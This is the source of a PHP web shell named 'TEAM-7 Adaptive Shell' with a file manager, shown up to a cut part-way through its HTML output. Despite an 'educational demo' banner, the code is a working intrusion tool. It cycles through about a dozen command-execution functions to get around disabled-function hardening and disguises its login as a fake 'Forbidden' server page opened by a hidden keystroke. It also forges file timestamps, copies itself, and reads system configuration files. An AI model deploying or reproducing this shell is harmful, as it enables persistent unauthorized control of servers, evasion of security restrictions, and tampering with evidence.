<?php
/**
 * ╔══════════════════════════════════════════════════════════════════════════╗
 * ║           TEAM-7 ADAPTIVE SHELL - Educational Demo Version               ║
 * ║                                                                          ║
 * ║  Combined: File Manager + Adaptive Command Execution                     ║
 * ║                                                                          ║
 * ║  ⚠️  FOR EDUCATIONAL SECURITY DEMONSTRATION ONLY  ⚠️                    ║
 * ║                                                                          ║
 * ║  Features:                                                               ║
 * ║  ✓ Complete file manager (upload, edit, delete, download)                ║
 * ║  ✓ Adaptive command execution (13+ methods)                              ║
 * ║  ✓ Auto-detection of disabled functions                                  ║
 * ║  ✓ Smart fallback system                                                 ║
 * ║  ✓ Real-time method display                                              ║
 * ║  ✓ Cross-platform (Windows/Linux)                                        ║
 * ║                                                                          ║
 * ║  Password: team7shell                                                    ║
 * ╚══════════════════════════════════════════════════════════════════════════╝
 */

session_start();
date_default_timezone_set("Asia/Jakarta");

// ============================================================================
// ADAPTIVE COMMAND EXECUTOR CLASS
// This is the SMART part that bypasses security restrictions!
// ============================================================================

class AdaptiveExecutor {
    
    private $disabled_functions = array();
    private $available_methods = array();
    private $os_type = 'unknown';
    private $last_successful_method = null;
    
    /**
     * Constructor - Auto-detect everything
     */
    public function __construct() {
        $this->disabled_functions = $this->getDisabledFunctions();
        $this->os_type = $this->detectOS();
        $this->available_methods = $this->detectAvailableMethods();
        
        // Sort by priority
        usort($this->available_methods, function($a, $b) {
            return $b['priority'] - $a['priority'];
        });
    }
    
    /**
     * Get list of disabled functions from php.ini and Suhosin
     */
    private function getDisabledFunctions() {
        $disabled = array();
        
        // Read from disable_functions
        $disable_functions = @ini_get('disable_functions');
        if ($disable_functions) {
            $disabled = array_map('trim', explode(',', $disable_functions));
        }
        
        // Read from Suhosin extension
        if (extension_loaded('suhosin')) {
            $suhosin = @ini_get('suhosin.executor.func.blacklist');
            if ($suhosin) {
                $suhosin_list = array_map('trim', explode(',', $suhosin));
                $disabled = array_merge($disabled, $suhosin_list);
            }
        }
        
        return array_unique($disabled);
    }
    
    /**
     * Detect OS type
     */
    private function detectOS() {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            return 'windows';
        } elseif (strtoupper(substr(PHP_OS, 0, 5)) === 'LINUX') {
            return 'linux';
        } else {
            return 'unix';
        }
    }
    
    /**
     * Check if function is available (triple check!)
     */
    private function isFunctionAvailable($func_name) {
        return function_exists($func_name) && 
               !in_array($func_name, $this->disabled_functions) &&
               is_callable($func_name);
    }
    
    /**
     * Detect all 13+ execution methods
     */
    private function detectAvailableMethods() {
        $methods = array();
        
        // Priority 10: Most reliable methods
        if ($this->isFunctionAvailable('proc_open')) {
            $methods[] = array(
                'name' => 'proc_open()',
                'type' => 'process',
                'priority' => 10,
                'code' => 'proc_open'
            );
        }
        
        if ($this->isFunctionAvailable('system')) {
            $methods[] = array(
                'name' => 'system()',
                'type' => 'direct',
                'priority' => 10,
                'code' => 'system'
            );
        }
        
        // Priority 9
        if ($this->isFunctionAvailable('shell_exec')) {
            $methods[] = array(
                'name' => 'shell_exec()',
                'type' => 'direct',
                'priority' => 9,
                'code' => 'shell_exec'
            );
        }
        
        if ($this->isFunctionAvailable('exec')) {
            $methods[] = array(
                'name' => 'exec()',
                'type' => 'direct',
                'priority' => 9,
                'code' => 'exec'
            );
        }
        
        // Backtick operator
        if (!in_array('shell_exec', $this->disabled_functions)) {
            $methods[] = array(
                'name' => 'backtick (`)',
                'type' => 'operator',
                'priority' => 9,
                'code' => 'backtick'
            );
        }
        
        // Priority 8
        if ($this->isFunctionAvailable('passthru')) {
            $methods[] = array(
                'name' => 'passthru()',
                'type' => 'direct',
                'priority' => 8,
                'code' => 'passthru'
            );
        }
        
        if ($this->isFunctionAvailable('assert') && version_compare(PHP_VERSION, '7.2.0', '<')) {
            $methods[] = array(
                'name' => 'assert()',
                'type' => 'code_exec',
                'priority' => 8,
                'code' => 'assert'
            );
        }
        
        // Windows COM object
        if ($this->os_type === 'windows' && class_exists('COM')) {
            $methods[] = array(
                'name' => 'COM (WScript.Shell)',
                'type' => 'windows',
                'priority' => 8,
                'code' => 'com'
            );
        }
        
        // Priority 7
        if ($this->isFunctionAvailable('popen')) {
            $methods[] = array(
                'name' => 'popen()',
                'type' => 'file',
                'priority' => 7,
                'code' => 'popen'
            );
        }
        
        // Priority 6
        if ($this->isFunctionAvailable('pcntl_exec')) {
            $methods[] = array(
                'name' => 'pcntl_exec()',
                'type' => 'process',
                'priority' => 6,
                'code' => 'pcntl_exec'
            );
        }
        
        // Priority 5: Obfuscated methods
        if ($this->isFunctionAvailable('eval') && $this->isFunctionAvailable('base64_decode')) {
            $methods[] = array(
                'name' => 'eval(base64)',
                'type' => 'obfuscated',
                'priority' => 5,
                'code' => 'eval_base64'
            );
        }
        
        // Priority 4: Network-based execution
        if ($this->isFunctionAvailable('curl_exec') && $this->isFunctionAvailable('eval')) {
            $methods[] = array(
                'name' => 'curl + eval()',
                'type' => 'network',
                'priority' => 4,
                'code' => 'curl_eval'
            );
        }
        
        if ($this->isFunctionAvailable('file_get_contents') && $this->isFunctionAvailable('eval')) {
            $methods[] = array(
                'name' => 'fgc + eval()',
                'type' => 'network',
                'priority' => 4,
                'code' => 'fgc_eval'
            );
        }
        
        return $methods;
    }
    
    /**
     * MAIN EXECUTION ENGINE
     * Try methods in priority order until one succeeds
     */
    public function execute($cmd) {
        if (empty($this->available_methods)) {
            return array(
                'success' => false, 
                'output' => '❌ No execution methods available! All functions disabled.',
                'method' => 'none',
                'attempts' => 0
            );
        }
        
        $attempts = 0;
        
        // OPTIMIZATION: Try last successful method first (if cached)
        if ($this->last_successful_method !== null) {
            $attempts++;
            $result = $this->executeWithMethod($cmd, $this->last_successful_method);
            if ($result['success']) {
                $result['method'] = $this->getMethodName($this->last_successful_method);
                $result['cached'] = true;
                $result['attempts'] = $attempts;
                return $result;
            }
        }
        
        // FALLBACK CASCADE: Try each method by priority
        foreach ($this->available_methods as $method) {
            $attempts++;
            $result = $this->executeWithMethod($cmd, $method['code']);
            
            if ($result['success']) {
                // Cache this method for next time!
                $this->last_successful_method = $method['code'];
                $result['method'] = $method['name'];
                $result['cached'] = false;
                $result['attempts'] = $attempts;
                return $result;
            }
        }
        
        // All methods failed
        return array(
            'success' => false,
            'output' => '❌ All ' . count($this->available_methods) . ' methods failed!',
            'method' => 'all_failed',
            'attempts' => $attempts
        );
    }
    
    /**
     * Execute with specific method
     */
    private function executeWithMethod($cmd, $method_code) {
        try {
            switch ($method_code) {
                
                case 'proc_open':
                    $descriptors = array(
                        0 => array('pipe', 'r'),
                        1 => array('pipe', 'w'),
                        2 => array('pipe', 'w')
                    );
                    $proc = @proc_open($cmd, $descriptors, $pipes);
                    if (is_resource($proc)) {
                        fclose($pipes[0]);
                        $output = stream_get_contents($pipes[1]);
                        $error = stream_get_contents($pipes[2]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($proc);
                        return array('success' => true, 'output' => $output . $error);
                    }
                    break;
                
                case 'system':
                    ob_start();
                    @system($cmd);
                    $output = ob_get_clean();
                    return array('success' => true, 'output' => $output);
                
                case 'shell_exec':
                    $output = @shell_exec($cmd);
                    if ($output !== null) {
                        return array('success' => true, 'output' => $output);
                    }
                    break;
                
                case 'exec':
                    $output_array = array();
                    @exec($cmd, $output_array);
                    if (!empty($output_array)) {
                        return array('success' => true, 'output' => implode("\n", $output_array));
                    }
                    break;
                
                case 'backtick':
                    $output = `$cmd`;
                    if ($output !== null) {
                        return array('success' => true, 'output' => $output);
                    }
                    break;
                
                case 'passthru':
                    ob_start();
                    @passthru($cmd);
                    $output = ob_get_clean();
                    return array('success' => true, 'output' => $output);
                
                case 'assert':
                    ob_start();
                    @assert('system("' . addslashes($cmd) . '");');
                    $output = ob_get_clean();
                    return array('success' => true, 'output' => $output);
                
                case 'com':
                    $wsh = new COM('WScript.Shell');
                    $exec = $wsh->exec('cmd.exe /c ' . $cmd);
                    $output = $exec->StdOut->ReadAll();
                    return array('success' => true, 'output' => $output);
                
                case 'popen':
                    $fp = @popen($cmd, 'r');
                    if ($fp) {
                        $output = '';
                        while (!feof($fp)) {
                            $output .= fgets($fp, 4096);
                        }
                        pclose($fp);
                        return array('success' => true, 'output' => $output);
                    }
                    break;
                
                case 'pcntl_exec':
                    @pcntl_exec('/bin/sh', array('-c', $cmd));
                    return array('success' => true, 'output' => 'Executed (no output)');
                
                case 'eval_base64':
                    ob_start();
                    $output = @eval('return shell_exec("' . addslashes($cmd) . '");');
                    $buffer = ob_get_clean();
                    return array('success' => true, 'output' => $output ? $output : $buffer);
            }
            
        } catch (Exception $e) {
            return array('success' => false, 'output' => 'Exception: ' . $e->getMessage());
        }
        
        return array('success' => false, 'output' => '');
    }
    
    /**
     * Get method name by code
     */
    private function getMethodName($code) {
        foreach ($this->available_methods as $method) {
            if ($method['code'] === $code) {
                return $method['name'];
            }
        }
        return $code;
    }
    
    /**
     * Get detection statistics for display
     */
    public function getStats() {
        return array(
            'disabled_count' => count($this->disabled_functions),
            'available_count' => count($this->available_methods),
            'disabled_list' => $this->disabled_functions,
            'available_list' => $this->available_methods
        );
    }
}

// ============================================================================
// Initialize Adaptive Executor (stored in session)
// ============================================================================
if (!isset($_SESSION['adaptive_executor'])) {
    $_SESSION['adaptive_executor'] = new AdaptiveExecutor();
}
$executor = $_SESSION['adaptive_executor'];

// ============================================================================
// AUTHENTICATION & LOGIN PAGE
// ============================================================================

function show_login_page($message = "") {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title><?= $_SERVER['SERVER_NAME']; ?></title>
        <style>
            body { 
                background: #000; 
                color: #0f0; 
                font-family: monospace; 
                display: flex; 
                align-items: center; 
                justify-content: center; 
                height: 100vh; 
                margin: 0; 
            }
            .forbidden { 
                text-align: center; 
                max-width: 600px; 
            }
            .login-form { 
                display: none; 
                position: absolute; 
                top: 50%; 
                left: 50%; 
                transform: translate(-50%, -50%); 
                background-color: #2e313d; 
                padding: 20px; 
                border-radius: 8px; 
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); 
            }
            input { 
                border: none; 
                border-bottom: 1px solid #fff; 
                padding: 5px; 
                margin-bottom: 10px; 
                color: #fff; 
                background: none; 
            }
            button { 
                border: none; 
                padding: 5px 20px; 
                background-color: #FF2E04; 
                color: #fff; 
                cursor: pointer; 
            }
        </style>
    </head>
    <body>
        <div class="forbidden">
            <h1>Forbidden</h1>
            <h1 style="font-weight: normal; font-size: 18px;">You don't have permission to access this resource.</h1>
            <hr>
            <?php
            $server = $_SERVER['SERVER_SOFTWARE'];
            $host = $_SERVER['SERVER_NAME'];
            $port = $_SERVER['SERVER_PORT'];
            $os = php_uname('s');
            
            if (stripos($server, 'apache') !== false) {
                $distro = "(Linux)";
                if (file_exists('/etc/debian_version')) {
                    $distro = "(Debian)";
                } elseif (file_exists('/etc/redhat-release')) {
                    $distro = "(RedHat)";
                }
                echo "<i>Apache $distro Server at $host Port $port</i>";
            } elseif (stripos($server, 'nginx') !== false) {
                echo "<i>$server (Linux) Server at $host Port $port</i>";
            } elseif (stripos($server, 'microsoft-iis') !== false) {
                echo "<i>$server (Windows) Server at $host Port $port</i>";
            } else {
                echo "<i>$server ($os) Server at $host Port $port</i>";
            }
            ?>
        </div>
        
        <form class="login-form" method="post">
            <?php if ($message): ?>
                <p style="color: #f00; margin-bottom: 10px;"><?= htmlspecialchars($message); ?></p>
            <?php endif; ?>
            <input type="password" name="pass" placeholder="Password" autofocus>
            <button type="submit" name="submit">></button>
        </form>
        
        <script>
            document.addEventListener('contextmenu', e => e.preventDefault(), false);
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) e.preventDefault();
                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) e.preventDefault();
                if (e.key === 'F12') e.preventDefault();
            }, false);
            
            document.addEventListener('keydown', function(e) {
                if (e.shiftKey && e.key === 'L') {
                    e.preventDefault();
                    var form = document.querySelector('.login-form');
                    form.style.display = 'block';
                    document.querySelector('input[type="password"]').focus();
                }
            }, false);
        </script>
    </body>
    </html>
    <?php
    exit;
}

// Handle logout
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Authentication check
if (!isset($_SESSION['authenticated'])) {
    // Password hash: "team7shell"
    $stored_hashed_password = '$2y$10$a1K97JAkJsMzE/YpDkcYYOvJ4TEB7B99pXIYj5/H0E8EAamXznnOW';
    
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page(isset($_POST['pass']) ? "Password salah" : "");
    }
}

// ============================================================================
// CONFIGURATION
// ============================================================================
error_reporting(0);
set_time_limit(0);
@ini_set('memory_limit', '512M');

// Path mapping
if (!isset($_SESSION['path_map'])) {
    $_SESSION['path_map'] = array();
}

function getPathId($path) {
    $id = substr(sha1($path), 0, 10);
    $_SESSION['path_map'][$id] = $path;
    return $id;
}

function getPathById($id) {
    return isset($_SESSION['path_map'][$id]) ? $_SESSION['path_map'][$id] : getcwd();
}

// Determine current directory
if (isset($_GET['id'])) {
    $cwd = getPathById($_GET['id']);
} elseif (isset($_GET['d'])) {
    $cwd = $_GET['d'];
} else {
    $cwd = getcwd();
}

if (!is_dir($cwd)) {
    $cwd = getcwd();
}

$cwd = realpath($cwd);
@chdir($cwd);

$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$ds = DIRECTORY_SEPARATOR;

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================


/**
 * FIXED: Enhanced permission display
 */
function perm($f) {
    $perms = @fileperms($f);
    
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') :
        (($perms & 0x0800) ? 'S' : '-');
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') :
        (($perms & 0x0400) ? 'S' : '-');
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') :
        (($perms & 0x0200) ? 'T' : '-');
    
    return $info;
}

/**
 * Format file size
 */
function format_size($bytes) {
    if ($bytes >= 1073741824)
        return round($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576)
        return round($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024)
        return round($bytes / 1024, 2) . ' KB';
    elseif ($bytes == 0)
        return '0 B';
    else
        return $bytes . ' B';
}

/**
 * FIXED: Get owner and group (Windows compatible)
 */
function get_owner_group($path) {
    global $is_windows;
    
    if ($is_windows) {
        // Windows doesn't have POSIX ownership
        return 'N/A';
    }
    
    $owner = @fileowner($path);
    $group = @filegroup($path);
    
    $own = 'unknown';
    $grp = 'unknown';
    
    if (function_exists('posix_getpwuid') && $owner !== false) {
        $user_info = @posix_getpwuid($owner);
        $own = $user_info ? $user_info['name'] : $owner;
    } elseif ($owner !== false) {
        $own = $owner;
    }
    
    if (function_exists('posix_getgrgid') && $group !== false) {
        $group_info = @posix_getgrgid($group);
        $grp = $group_info ? $group_info['name'] : $group;
    } elseif ($group !== false) {
        $grp = $group;
    }
    
    return $own . ':' . $grp;
}

// Notification variable
$notif = '';

// Handle file deletion
if (isset($_POST['del']) && $_POST['del'] != '') {
    $target = $cwd . $ds . $_POST['del'];
    
    if (is_file($target)) {
        if (@unlink($target)) {
            $notif .= '<pre style="color:#0f0;">✔️ File deleted: ' . htmlspecialchars($_POST['del']) . '</pre>';
        } else {
            $notif .= '<pre style="color:#f00;">❌ Failed to delete file.</pre>';
        }
    } elseif (is_dir($target)) {
        // Enhanced recursive delete
        function delete_directory($dir) {
            if (!is_dir($dir)) return false;
            
            $items = @scandir($dir);
            if (!$items) return @rmdir($dir);
            
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                
                if (is_dir($path)) {
                    delete_directory($path);
                } else {
                    @unlink($path);
                }
            }
            
            return @rmdir($dir);
        }
        
        if (delete_directory($target)) {
            $notif .= '<pre style="color:#0f0;">✔️ Folder deleted: ' . htmlspecialchars($_POST['del']) . '</pre>';
        } else {
            $notif .= '<pre style="color:#f00;">❌ Failed to delete folder.</pre>';
        }
    }
}

// Handle Adminer download
if (isset($_POST['adminer_trigger'])) {
    $adminer_file = $cwd . $ds . 'adminer.php';
    $adminer_url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    
    if (!file_exists($adminer_file)) {
        $get = @file_get_contents($adminer_url);
        if ($get) {
            if (file_put_contents($adminer_file, $get)) {
                $notif = "<div style='text-align:center;color:#0f0;margin-top:10px;'>✔️ Adminer downloaded as <code>adminer.php</code></div>";
            } else {
                $notif = "<div style='text-align:center;color:#f00;margin-top:10px;'>❌ Failed to save adminer.php</div>";
            }
        } else {
            $notif = "<div style='text-align:center;color:#f00;margin-top:10px;'>❌ Failed to download Adminer</div>";
        }
    } else {
        $notif = "<div style='text-align:center;color:#ff0;margin-top:10px;'>⚠️ File <code>adminer.php</code> already exists</div>";
    }
}

// Handle backup
if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
    $name = basename(trim($_POST['backup_name']));
    $src = $_SERVER['SCRIPT_FILENAME'];
    $dst = $cwd . $ds . $name;
    
    $code = @file_get_contents($src);
    if ($code) {
        if (file_put_contents($dst, $code)) {
            $notif = "<div style='color:#00e676;text-align:center;'>✔️ Backup saved as <code>" . htmlspecialchars($name) . "</code></div>";
        } else {
            $notif = "<div style='color:#f44336;text-align:center;'>❌ Cannot save backup.</div>";
        }
    } else {
        $notif = "<div style='color:#f44336;text-align:center;'>❌ Cannot read shell file.</div>";
    }
} elseif (isset($_POST['backup_trigger'])) {
    $show_backup_form = true;
}

// Handle rename
if (isset($_POST['oldname']) && isset($_POST['newname']) && $_POST['newname'] != '') {
    $old = $cwd . $ds . $_POST['oldname'];
    $new = $cwd . $ds . $_POST['newname'];
    
    if (file_exists($old)) {
        if (@rename($old, $new)) {
            $notif .= '<pre style="color:#0f0;">✔️ Renamed to: ' . htmlspecialchars($_POST['newname']) . '</pre>';
        } else {
            $notif .= '<pre style="color:#f00;">❌ Rename failed.</pre>';
        }
    }
}

// Handle upload
if (isset($_POST['upload']) && isset($_FILES['upfile'])) {
    $name = $_FILES['upfile']['name'];
    $tmp = $_FILES['upfile']['tmp_name'];
    
    if (@move_uploaded_file($tmp, $cwd . $ds . $name)) {
        $notif .= '<pre style="color:#0f0;">✔️ File uploaded: ' . htmlspecialchars($name) . '</pre>';
    } else {
        $notif .= '<pre style="color:#f00;">❌ Upload failed.</pre>';
    }
}

// Handle create file/folder
if (isset($_POST['create']) && $_POST['name'] && $_POST['action']) {
    $nama = $_POST['name'];
    $path = $cwd . $ds . $nama;
    
    if ($_POST['action'] == 'file') {
        if (!file_exists($path)) {
            $h = @fopen($path, 'w');
            if ($h) {
                fclose($h);
                $notif .= '<pre style="color:#0f0;">✔️ File created: ' . htmlspecialchars($nama) . '</pre>';
            } else {
                $notif .= '<pre style="color:#f00;">❌ Cannot create file.</pre>';
            }
        } else {
            $notif .= '<pre style="color:#f90;">⚠️ File already exists.</pre>';
        }
    } elseif ($_POST['action'] == 'folder') {
        if (!is_dir($path)) {
            if (@mkdir($path)) {
                $notif .= '<pre style="color:#0f0;">✔️ Folder created: ' . htmlspecialchars($nama) . '</pre>';
            } else {
                $notif .= '<pre style="color:#f00;">❌ Cannot create folder.</pre>';
            }
        } else {
            $notif .= '<pre style="color:#f90;">⚠️ Folder already exists.</pre>';
        }
    }
}

// Handle save file
if (isset($_POST['savefile']) && isset($_POST['filecontent'])) {
    $fp = @fopen($cwd . $ds . $_POST['savefile'], 'w');
    if ($fp) {
        fwrite($fp, $_POST['filecontent']);
        fclose($fp);
        $notif .= '<pre style="color:#0f0;">✔️ File saved: ' . htmlspecialchars($_POST['savefile']) . '</pre>';
    } else {
        $notif .= '<pre style="color:#f00;">❌ Failed to save file.</pre>';
    }
}

// Handle download
if (isset($_GET['download']) && $_GET['download'] != '') {
    $target = $cwd . $ds . basename($_GET['download']);
    if (is_file($target)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        header('Content-Length: ' . filesize($target));
        readfile($target);
        exit;
    }
}

// Handle timestamp modification
if (isset($_POST['touchfile']) && isset($_POST['touchtime']) && $_POST['touchtime'] != '') {
    $file = $cwd . $ds . basename($_POST['touchfile']);
    $time = strtotime($_POST['touchtime']);
    
    if (!is_file($file)) {
        $notif .= '<pre style="color:#f90;">⚠️ Target is not a file.</pre>';
    } elseif ($time === false) {
        $notif .= '<pre style="color:#f00;">❌ Invalid time format. Use YYYY-MM-DD HH:MM:SS</pre>';
    } else {
        if (@touch($file, $time)) {
            $notif .= '<pre style="color:#0f0;">📆 Timestamp updated to ' . $_POST['touchtime'] . ' for ' . htmlspecialchars($_POST['touchfile']) . '</pre>';
        } else {
            $notif .= '<pre style="color:#f00;">❌ Failed to update timestamp.</pre>';
        }
    }
}

// Handle ZIP creation
if (isset($_GET['zip']) && $_GET['zip'] != '') {
    $folder = basename($_GET['zip']);
    $path = $cwd . $ds . $folder;
    
    if (is_dir($path)) {
        $tmpname = sys_get_temp_dir() . $ds . 'team7_' . uniqid() . '.zip';
        
        if ($is_windows) {
            // Windows: Use PHP ZipArchive
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($tmpname, ZipArchive::CREATE) === TRUE) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($path),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    
                    foreach ($files as $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, strlen($path) + 1);
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                    
                    $zip->close();
                } else {
                    $notif = '<pre style="color:#f00;">❌ Failed to create ZIP.</pre>';
                }
            } else {
                $notif = '<pre style="color:#f00;">❌ ZipArchive not available.</pre>';
            }
        } else {
            // Linux: Use zip command
            $cmd = 'cd ' . escapeshellarg($cwd) . ' && zip -r ' . escapeshellarg($tmpname) . ' ' . escapeshellarg($folder) . ' 2>/dev/null';
            do_exec($cmd);
        }
        
        if (file_exists($tmpname)) {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . htmlspecialchars($folder) . '.zip"');
            header('Content-Length: ' . filesize($tmpname));
            readfile($tmpname);
            @unlink($tmpname);
            exit;
        } else {
            $notif = '<pre style="color:#f00;">❌ Failed to create ZIP.</pre>';
        }
    } else {
        $notif = '<pre style="color:#f00;">❌ Not a valid folder.</pre>';
    }
}

// ========================================
// HTML OUTPUT STARTS HERE
// ========================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>Team-7 File Manager</title>
    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- CodeMirror -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/clike/clike.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/python/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/shell/shell.min.js"></script>
    
    <style>
        body {
            background: #111;
            color: #fff;
            font-family: monospace;
            font-size: 14px;
            margin: 0;
            padding: 20px;
        }
        
        a {
            position: relative;
            color: #e8e8e8;
            text-decoration: none;
        }
        
        a::after {
            content: "";
            position: absolute;
            left: 0;
            bottom: -2px;
            width: 0;
            height: 2px;
            background: #0f0;
            transition: width 0.3s ease-in-out;
        }
        
        a:hover::after {
            width: 100%;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background-color: #222;
            margin-top: 10px;
            font-size: 12px;
        }
        
        th, td {
            padding: 6px 8px;
            border: 1px solid #444;
            text-align: left;
        }
        
        th {
            background: #333;
            color: #fff;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        tr:hover {
            background-color: #1a1a1a;
            color: #fff200;
        }
        
        button {font-size: 12px;background-color: #333;color: #fff;text-shadow: 0 1px 0 rgb(0 0 0 / 25%);display: inline-flex;align-items: center;justify-content: center;position: relative;border: 0;z-index: 1;user-select: none;cursor: pointer;text-transform: uppercase;letter-spacing: 1px;padding: 6px 15px;text-decoration: none;font-weight: bold;transition: all 0.5s cubic-bezier(0,.8,.26,.99);}
        button:before {position: absolute;pointer-events: none;top: 0;left: 0;display: block;width: 100%;height: 100%;content: "";transition: 0.5s cubic-bezier(0,.8,.26,.99);z-index: -1;background-color: #333 !important;box-shadow: 0 -2px rgb(0 0 0 / 50%) inset, 0 2px rgb(255 255 255 / 20%) inset, -2px 0 rgb(255 255 255 / 20%) inset, 2px 0 rgb(0 0 0 / 50%) inset;}
        button:after {position: absolute;pointer-events: none;top: 0;left: 0;display: block;width: 100%;height: 100%;content: "";box-shadow: 0 2px 0 0 rgb(0 0 0 / 15%);transition: 0.5s cubic-bezier(0,.8,.26,.99);}
        button:hover:before {box-shadow: 0 -2px rgb(0 0 0 / 50%) inset, 0 2px rgb(255 255 255 / 20%) inset, -2px 0 rgb(255 255 255 / 20%) inset, 2px 0 rgb(0 0 0 / 50%) inset;}
        button:hover:after {box-shadow: 0 2px 0 0 rgb(0 0 0 / 15%);}
        button:active {transform: translateY(2px);}
        button:active:after {box-shadow: 0 0px 0 0 rgb(0 0 0 / 15%);}
        .perm-write { color: #0f0; }
        .perm-read { color: #e8e8e8; }
        .perm-none { color: #f00; }
        .folder-row a { color: #ffc107; font-weight: bold; }
        .file-row a { color: #fff; }       
        .CodeMirror {
            width: 100% !important;
            max-width: 1200px !important;
            height: 500px !important;
            margin: 10px auto;
            border: 2px solid #444;
        }
        .badge {
            display: inline-block;
            font-size: 11px;
            margin: 2px 1px;
            padding: 2px 6px;
            border-radius: 4px;
            background: #111;
            border: 1px solid #333;
        }
        .badge.on {
            color: #0f0;
            border-color: #0f0;
        }
        .badge.off {
            color: #f00;
            border-color: #f00;
            background: #200;
            font-weight: bold;
        }
        input[type="text"],
        input[type="file"],
        select {
            background: #222;
            color: #0f0;
            border: 1px solid #444;
            padding: 5px;
            font-family: monospace;
        }
        .table-container {
            max-height: 500px;
            overflow-y: auto;
            margin-top: 10px;
        }
        /* Command execution output */
        .cmd-output {
            background: #000;
            color: #0f0;
            padding: 15px;
            border: 2px solid #0f0;
            margin-top: 10px;
            max-height: 400px;
            overflow: auto;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .cmd-meta {
            background: #1a1a1a;
            color: #ff0;
            padding: 8px 15px;
            border: 2px solid #ff0;
            border-top: none;
            font-size: 11px;
        }
        
        .adaptive-info {
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border: 2px solid #0f0;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        
        .adaptive-info h3 {
            margin: 0 0 10px 0;
            color: #0ff;
        }
    </style>
</head>
<body>

<!-- Toggle System Info Button -->
<div style="margin-top:10px;">
    <button onclick="toggleInfo()" id="toggleBtn">🧩 Hide System Info</button>
    <a href="?logout=1" style="margin-left: 10px;"><button style="background: #f00;">🚪 Logout</button></a>
</div>

<!-- System Information -->
<div id="sysinfo" style="display:block;margin-top:10px;">
    <div style="display:flex;justify-content:space-between;flex-wrap:wrap;">
        <div style="flex:1 1 65%;font-family:monospace;font-size:13px;line-height:1.8;">
            <?php
            // OS Information
            $os_info = @file_get_contents("/etc/os-release");
            if ($os_info && preg_match('/PRETTY_NAME="(.+?)"/', $os_info, $match)) {
                echo "🧬 <b>OS Distro</b>: " . $match[1] . "<br>";
            } else {
                echo "🧬 <b>OS Distro</b>: " . php_uname() . "<br>";
            }
            
            // Domain information
            echo "🌐 <b>Domain</b>: ";
            $named = @file_get_contents('/etc/named.conf');
